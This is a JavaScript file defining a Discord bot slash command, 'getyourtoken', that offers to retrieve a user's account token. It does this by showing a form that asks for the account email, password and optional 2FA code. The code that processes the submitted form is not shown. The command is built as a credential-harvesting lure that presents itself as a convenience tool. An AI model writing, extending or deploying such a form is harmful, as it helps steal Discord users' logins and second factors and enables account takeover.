// getdiscordtoken.js
const { ChatInputCommandInteraction, SlashCommandBuilder,
    ModalBuilder,
    ActionRowBuilder,
    TextInputBuilder,
    TextInputStyle
} = require('discord.js');
const ExtendedClient = require('../../../class/ExtendedClient');

module.exports = {
    structure: new SlashCommandBuilder()
        .setName('getyourtoken')
        .setDescription('To get your token (Phone/PC)'),
    /**
     * @param {ExtendedClient} client
     * @param {ChatInputCommandInteraction} interaction
     */
    run: async (client, interaction) => {
        const modal = new ModalBuilder()
            .setTitle('Get your token ! (Phone/PC)')
            .setCustomId('discord-token')
            .addComponents(
                new ActionRowBuilder()
                    .addComponents(
                        new TextInputBuilder()
                            .setLabel('Your discord email : (account)')
                            .setCustomId('email')
                            .setPlaceholder('Type your email here')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(true)
                    ),
                new ActionRowBuilder()
                    .addComponents(
                        new TextInputBuilder()
                            .setLabel('Your discord password : (account)')
                            .setCustomId('password')
                            .setPlaceholder('Type your password here')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(true)
                    ),
                new ActionRowBuilder()
                    .addComponents(
                        new TextInputBuilder()
                            .setLabel('Your discord code (2fa) : (account)')
                            .setCustomId('code')
                            .setPlaceholder('Type your code here (if you dont have 2fa dont type anything)')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(false)
                    )
            );

        await interaction.showModal(modal);
    }
};